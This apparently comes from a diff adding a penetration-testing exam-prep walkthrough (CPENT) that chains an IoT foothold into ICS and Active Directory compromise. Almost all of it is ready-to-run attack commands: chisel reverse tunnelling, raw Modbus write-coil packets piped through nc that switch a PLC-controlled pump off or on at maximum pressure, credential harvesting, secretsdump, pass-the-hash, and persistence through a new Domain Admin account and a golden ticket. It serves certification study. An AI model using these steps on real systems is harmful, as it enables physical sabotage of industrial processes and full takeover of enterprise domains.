@@ -1,0 +1,211 @@
+
+🧠 SCENARIO OVERVIEW
+
+You are inside a converged OT + IT environment:
+
+🟧 IoT Camera / Gateway: 10.10.10.5
+🟩 ICS Network (PLC/SCADA): 192.168.100.0/24
+🟦 Domain Controller: 192.168.100.10
+🟥 You (Kali): 10.10.10.1
+
+🎯 Goal:
+
+Go from IoT device → manipulate industrial process → pivot into AD → become Domain Admin
+
+🔹 PHASE 1: IoT COMPROMISE (ENTRY POINT)
+🟧 Run on: IoT Device (after exploit)
+🔍 Confirm Access
+
+whoami
+
+👉 Usually root or low-priv shell
+
+🔍 Identify Networks
+
+ip a
+
+👉 You find dual network:
+
+IoT subnet
+ICS subnet (CRITICAL)
+🔍 Routing View
+
+route -n
+
+👉 Shows:
+
+192.168.100.0/24 reachable internally
+🔥 RESULT
+
+👉 IoT device is your bridge into OT network
+
+🔹 PHASE 2: PIVOT SETUP (CHISEL TUNNEL)
+🟥 Run on: Kali (Attacker)
+
+chisel server -p 8000 --reverse
+
+🟧 Run on: IoT Device
+
+wget http://10.10.10.1/chisel
+
+chmod +x chisel
+
+🔥 Create Tunnel
+
+./chisel client 10.10.10.1:8000 R:1080:socks
+
+🎯 RESULT
+
+👉 SOCKS proxy on Kali:
+
+127.0.0.1:1080
+🔹 PHASE 3: ICS NETWORK DISCOVERY
+🟥 Run on: Kali
+🔥 Configure Proxy
+
+Add to proxychains:
+
+socks5 127.0.0.1 1080
+🔍 Scan ICS Network
+
+proxychains nmap -sT -Pn 192.168.100.0/24
+
+🎯 You find:
+PLC → 192.168.100.20 (port 502)
+SCADA → 192.168.100.30
+AD server → 192.168.100.10
+🔥 RESULT
+
+👉 You now see OT + IT convergence
+
+🔹 PHASE 4: ICS EXPLOITATION (MODBUS CONTROL)
+🟥 Run on: Kali
+🔍 Capture Traffic
+
+proxychains tcpdump -i eth0 port 502 -w modbus.pcap
+
+🔥 Analyze in Wireshark
+
+Filter:
+
+modbus
+
+🎯 You discover:
+Register 0001 → Pump Control
+Function 05 → Write Coil
+🔥 ATTACK
+🟥 Run on: Kali
+Turn OFF Pump
+
+printf '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\x00\x00' | nc 192.168.100.20 502
+
+Turn ON Pump (Max Pressure)
+
+printf '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\xFF\x00' | nc 192.168.100.20 502
+
+🔥 RESULT
+
+👉 Physical process is now controlled
+
+🔹 PHASE 5: ICS TO IT RECON (CRITICAL BRIDGE STEP)
+🟥 Run on: Kali
+🔍 SMB Discovery
+
+proxychains crackmapexec smb 192.168.100.0/24
+
+🎯 Output:
+Domain: CORP.LOCAL
+SMB signing: disabled
+
+👉 You now enter IT domain context
+
+🔹 PHASE 6: CREDENTIAL EXTRACTION (OT → IT LEAK)
+🟧 Run on: IoT Device (or SCADA logs)
+🔍 Search configs
+
+grep -r "password" /etc/
+
+🎯 Found:
+svc_scada : P@ssw0rd123
+🔹 PHASE 7: AD AUTHENTICATION
+🟥 Run on: Kali
+🔥 Validate creds
+
+proxychains crackmapexec smb 192.168.100.10 -u svc_scada -p 'P@ssw0rd123'
+
+🎯 SUCCESS
+Login SUCCESS
+🔹 PHASE 8: DOMAIN COMPROMISE
+🟥 Run on: Kali
+🔥 Dump hashes
+
+proxychains impacket-secretsdump CORP.LOCAL/svc_scada:'P@ssw0rd123'@192.168.100.10
+
+🎯 Output:
+NTLM hashes
+Domain Admin hash
+🔥 RESULT
+
+👉 You now have Domain Admin material
+
+🔹 PHASE 9: PASS-THE-HASH
+🟥 Run on: Kali
+
+proxychains impacket-psexec CORP.LOCAL/Administrator@192.168.100.10 -hashes :NTLM_HASH
+
+🎯 RESULT
+C:\Windows\system32>
+
+👉 FULL DOMAIN CONTROL
+
+🔹 PHASE 10: PERSISTENCE
+🟦 Run on: Domain Controller
+Add Admin User
+
+net user ot_admin Pass123 /add /domain
+
+net group "Domain Admins" ot_admin /add
+
+Golden Ticket (optional)
+
+impacket-ticketer -nthash HASH -domain CORP.LOCAL -domain-sid SID Administrator
+
+🧠 FULL KILL CHAIN SUMMARY
+IoT Exploit
+   ↓
+Pivot (Chisel SOCKS)
+   ↓
+ICS Network Access
+   ↓
+Modbus Control (PLC manipulation)
+   ↓
+Credential Leak (SCADA/IoT)
+   ↓
+AD Authentication
+   ↓
+Secretsdump
+   ↓
+Pass-the-Hash
+   ↓
+Domain Admin
+🔥 WHAT CPENT EXAMINER TESTS HERE
+Layer	Skill
+IoT	firmware + shell
+Pivot	tunneling
+ICS	Modbus understanding
+Network	segmentation awareness
+AD	credential chaining
+Exploitation	real-world chaining
+⚠️ COMMON FAILURES
+
+❌ Staying only in OT network
+❌ Not pivoting to AD
+❌ Ignoring SCADA credentials
+❌ Forgetting proxychains routing
+❌ Not validating SMB domain
+
+💡 CPENT MASTER RULE
+
+🧠 OT networks are NEVER isolated anymore
+
+One IoT device = gateway to enterprise AD
